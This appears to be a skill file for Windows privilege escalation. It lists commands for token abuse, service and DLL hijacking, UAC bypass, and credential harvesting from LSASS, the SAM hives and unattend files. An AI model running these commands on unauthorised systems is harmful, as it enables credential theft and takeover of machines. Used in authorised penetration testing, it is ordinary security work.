---
name: windows-privesc
description: Windows privilege escalation — tokens, services, DLLs, Potato, UAC.
tags: [windows, privesc, tokens, uac]
---
# Windows privesc

## Triage
- `whoami /all`, `systeminfo`, `wmic qfe`, `net user`, `net localgroup administrators`
- `cmdkey /list`, `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`, `dir /a C:\Users`
- `Get-Service | ? {$_.Status -eq "Running"}`, `sc qc`, `icacls`
- `winPEASx64.exe`, `Seatbelt.exe -group=all`, `PowerUp.ps1 Invoke-AllChecks`

## Tokens
- `whoami /priv` → SeImpersonate → PrintSpoofer / GodPotato / RoguePotato (Server 2019+).
- SeAssignPrimaryToken, SeBackupPrivilege (`robocopy /b` SAM/SYSTEM), SeRestore, SeTakeOwnership.
- SeDebugPrivilege → dump LSASS (`procdump -ma lsass.exe`), then pypykatz.
- SeLoadDriverPrivilege → vulnerable driver (Capcom.sys).

## Services
- Unquoted path: `sc qc $SVC` → `C:\Program Files\Foo Bar\svc.exe` → drop `C:\Program.exe`.
- Weak service ACL: `accesschk -uwcqv "Everyone" *` → `sc config $SVC binPath= "cmd /c ..."`.
- Writable service binary: replace, `sc stop/start`.
- DLL hijack: Procmon filter `NAME NOT FOUND` + `CreateFile` in the service dir.
- AlwaysInstallElevated: both HKLM/HKCU Installer values =1 → `msiexec /i evil.msi /qn`.

## UAC
- `fodhelper.exe` (auto-elevate, `HKCU\Software\Classes\ms-settings\shell\open\command`).
- `computerdefaults.exe`, `sdclt.exe`, `eventvwr.exe` msconfig hijack.
- UAC bypass only if the user is local admin; check `net localgroup administrators`.

## Credentials
- `reg save HKLM\SAM sam` + `SYSTEM` → `secretsdump.py -sam sam -system system LOCAL`.
- `findstr /si password *.xml *.ini *.txt`, `dir /s *pass*`.
- IIS: `%windir%\system32\inetsrv\config\applicationHost.config` (app pool creds).
- Unattend: `C:\Windows\Panther\Unattend.xml`, `unattend.txt`.

## Hidden knowledge
- `wmic product get name` is slow but reveals installed software with known CVEs.
- `icacls C:\ /t /c` finds world-writable dirs; `accesschk -w -s`.
- Scheduled tasks: `schtasks /query /fo LIST /v` → writable task binary.
- `cmd /c echo %PATH%` — PATH includes user-writable dirs on some builds.
- `C:\ProgramData\` and `C:\Windows\Temp\` are common drop points; check ACLs.
